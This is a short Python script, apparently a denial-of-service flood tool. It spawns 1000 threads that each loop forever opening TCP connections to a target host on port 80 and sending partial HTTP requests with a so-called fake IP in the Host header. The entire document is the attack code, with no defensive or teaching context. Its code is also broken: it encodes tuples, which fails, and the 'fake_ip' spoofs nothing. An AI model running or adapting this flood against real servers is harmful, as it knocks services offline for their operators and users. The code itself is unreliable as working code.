import threading
import socket
target='127.0.0.1'
port =80
fake_ip='205.88.65.22'
def attack():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(('GET /',target,' HTTP/1.1\r\n').encode('ascii'),(target,port))
        s.sendto(('Host: ',fake_ip,' HTTP/1.1\r\n').encode('ascii'),(target,port))
        s.close()

for i in range(1000):
    thread=threading.Thread(target=attack)
    thread.start()